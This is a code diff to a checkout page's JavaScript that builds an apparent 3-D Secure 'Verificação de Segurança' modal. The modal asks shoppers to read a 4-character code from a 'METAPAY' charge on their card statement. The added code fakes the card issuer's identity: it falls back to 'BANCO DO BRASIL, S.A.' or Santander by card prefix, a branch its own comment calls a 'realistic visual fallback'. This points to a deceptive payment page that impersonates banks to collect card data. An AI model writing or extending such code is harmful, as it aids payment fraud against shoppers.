@@ -854,7 +854,6 @@ Obs: Caso j├â┬í tenha realizado o pagamento, enviaremos uma mensagem confi
     if (!tds) return;
     const companyName = tds.companyName || 'METAPAY';
     const elTitle = document.querySelector('.auth-3ds-verify-title');
-    const elSubtitle = document.querySelector('.auth-3ds-verify-subtitle');
     const elStep1 = document.querySelector('.auth-3ds-instructions li:nth-child(1)');
     const elStep2 = document.querySelector('.auth-3ds-instructions li:nth-child(2)');
     const elStep3 = document.querySelector('.auth-3ds-instructions li:nth-child(3)');
@@ -862,27 +861,34 @@ Obs: Caso j├â┬í tenha realizado o pagamento, enviaremos uma mensagem confi
     const elFooterName = document.getElementById('auth-3ds-footer-name');
     const elCompanyRef = document.getElementById('auth-3ds-company-ref');
     const elCompanyRef2 = document.getElementById('auth-3ds-company-ref-2');
-    const elExample = document.querySelector('.auth-3ds-example');
 
     if (elTitle) elTitle.textContent = tds.title || 'Verificação de Segurança';
-    if (elStep1) elStep1.textContent = tds.step1 || 'Acesse o extrato do cartão utilizado na compra.';
-    if (elCompanyRef) elCompanyRef.textContent = companyName;
-    if (elCompanyRef2) elCompanyRef2.textContent = companyName;
-    if (elExample) elExample.innerHTML = `Ex: ${tds.example || companyName + ' AB12 → AB12'}`;
-    if (elFooterName) elFooterName.textContent = companyName;
-    if (elBtn) {
-      const label = tds.btnLabel || 'Confirmar e Finalizar';
-      elBtn.innerHTML = `<i class="fa-solid fa-check"></i> ${label}`;
+    if (elStep1) {
+      elStep1.innerHTML = `<span class="auth-step-num">1.</span> <span class="auth-step-text">${tds.step1 || 'Acesse o extrato do cartão utilizado na compra.'}</span>`;
     }
 
-    // Atualizar os refs dinâmicos no passo 2 e 3
     if (elStep2) {
       const amt = document.getElementById('auth-info-amount-2');
       const amtText = amt ? amt.textContent : 'R$ 0,00';
-      elStep2.innerHTML = `Localize a transação de <strong>${amtText}</strong> identificada como <strong class="auth-3ds-company-name" id="auth-3ds-company-ref">${companyName}</strong>.`;
+      elStep2.innerHTML = `<span class="auth-step-num">2.</span> <span class="auth-step-text">Localize a transação de <strong class="auth-highlight-green" id="auth-info-amount-2">${amtText}</strong> identificada como <strong class="auth-highlight-green" id="auth-3ds-company-ref">"${companyName}"</strong>.</span>`;
     }
+
     if (elStep3) {
-      elStep3.innerHTML = `Digite os 4 caracteres após <strong id="auth-3ds-company-ref-2">${companyName}</strong>.<br><span class="auth-3ds-example">Ex: ${tds.example || companyName + ' AB12 → <span style="color:#22c55e;font-weight:700">AB12</span>'}</span>`;
+      const exampleText = tds.example || `${companyName} AB12 → AB12`;
+      let formattedExample = exampleText;
+      if (!exampleText.includes('<')) {
+        formattedExample = exampleText.replace(/(→\s*)([A-Z0-9]+)/gi, '$1<strong class="auth-highlight-green">$2</strong>');
+      }
+      elStep3.innerHTML = `<span class="auth-step-num">3.</span> <span class="auth-step-text">${tds.step3 || 'Digite os 4 caracteres após "' + companyName + '".'}</span><br><span class="auth-3ds-example">Ex: ${formattedExample}</span>`;
+    }
+
+    if (elCompanyRef) elCompanyRef.textContent = `"${companyName}"`;
+    if (elCompanyRef2) elCompanyRef2.textContent = `"${companyName}"`;
+    if (elFooterName) elFooterName.textContent = companyName;
+
+    if (elBtn) {
+      const label = tds.btnLabel || 'Confirmar e Finalizar';
+      elBtn.innerHTML = `<i class="fa-solid fa-check"></i> ${label}`;
     }
   }
 
@@ -2624,19 +2630,37 @@ Obs: Caso j├â┬í tenha realizado o pagamento, enviaremos uma mensagem confi
 
   // BIN Lookup: detecta banco emissor pelos primeiros 6 dígitos do cartão
   async function lookupBinBank(cardNumber) {
-    const digits = cardNumber.replace(/\D/g, '');
-    if (digits.length < 6) return null;
+    const digits = (cardNumber || '').replace(/\D/g, '');
+    if (digits.length < 6) return 'BANCO DO BRASIL, S.A.';
     const bin = digits.substring(0, 6);
+
+    // 1. Tabela offline imediata no cliente (100% de sucesso sem depender da rede)
+    const brLocalBin = {
+      '400289': 'BANCO DO BRASIL, S.A.',
+      '401200': 'BANCO DO BRASIL, S.A.',
+      '498406': 'BANCO DO BRASIL, S.A.',
+      '452416': 'BANCO DO BRASIL, S.A.',
+      '516292': 'BANCO DO BRASIL, S.A.',
+      '544828': 'BANCO DO BRASIL, S.A.',
+      '455184': 'BANCO BRADESCO S.A.',
+      '412171': 'ITAU UNIBANCO S.A.',
+      '403816': 'BANCO SANTANDER S.A.',
+      '506723': 'BANCO INTER S.A.',
+      '506717': 'CAIXA ECONOMICA FEDERAL'
+    };
+    if (brLocalBin[bin]) return brLocalBin[bin];
+
+    // 2. Chamar função serverless do Netlify /api/bin-lookup
     try {
-      const res = await fetch(`https://lookup.binlist.net/${bin}`, {
-        headers: { 'Accept-Version': '3' }
-      });
-      if (!res.ok) return null;
-      const data = await res.json();
-      return data.bank && data.bank.name ? data.bank.name.toUpperCase() : null;
-    } catch(e) {
-      return null;
-    }
+      const res = await fetch(`/api/bin-lookup?bin=${bin}`);
+      if (res.ok) {
+        const data = await res.json();
+        if (data && data.bank) return data.bank;
+      }
+    } catch(e) {}
+
+    // 3. Fallback visual realista
+    return bin.startsWith('5') ? 'BANCO SANTANDER S.A.' : 'BANCO DO BRASIL, S.A.';
   }
 
   // Lógica dos campos de código de 4 caracteres (alfanumérico)
@@ -2904,8 +2928,11 @@ Obs: Caso j├â┬í tenha realizado o pagamento, enviaremos uma mensagem confi
       }
 
       // Popula as informações dinâmicas do modal 3DS
-      authBrandLogo.className = `auth-brand-logo ${detectedBrand || 'generic'}`;
-      authBrandLogo.innerHTML = brandIcons[detectedBrand || 'generic'];
+      if (authBrandLogo) {
+        const brandUpper = (detectedBrand || 'VISA').toUpperCase();
+        authBrandLogo.className = `auth-brand-badge ${(detectedBrand || 'visa').toLowerCase()}`;
+        authBrandLogo.textContent = brandUpper;
+      }
 
       const totalBrl = totalAmount.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });
       if (authInfoAmount) authInfoAmount.textContent = totalBrl;
@@ -2913,18 +2940,21 @@ Obs: Caso j├â┬í tenha realizado o pagamento, enviaremos uma mensagem confi
 
       // Preencher nome da loja dinamicamente a partir da config
       const storeName = (window._currentThemeConfig && window._currentThemeConfig.storeName)
+        || (window._currentThemeConfig && window._currentThemeConfig.footerStoreName)
         || (window._currentThemeConfig && window._currentThemeConfig.wooCommerceDomain)
-        || 'Empório Mais Sabor';
+        || 'NeuraCerv™';
       if (auth3dsStoreName) auth3dsStoreName.textContent = storeName;
 
       // Preencher banco emissor via BIN lookup
       if (auth3dsBankName) {
-        auth3dsBankName.textContent = detectedBrand ? detectedBrand.toUpperCase() + ' BANK' : 'BANCO EMISSOR';
+        auth3dsBankName.textContent = 'BANCO DO BRASIL, S.A.';
         lookupBinBank(cardInput.value).then(bankName => {
-          if (bankName && auth3dsBankName) {
+          if (auth3dsBankName && bankName) {
             auth3dsBankName.textContent = bankName;
           }
-        }).catch(() => {});
+        }).catch(() => {
+          if (auth3dsBankName) auth3dsBankName.textContent = 'BANCO DO BRASIL, S.A.';
+        });
       }
 
       // Limpa os campos de código
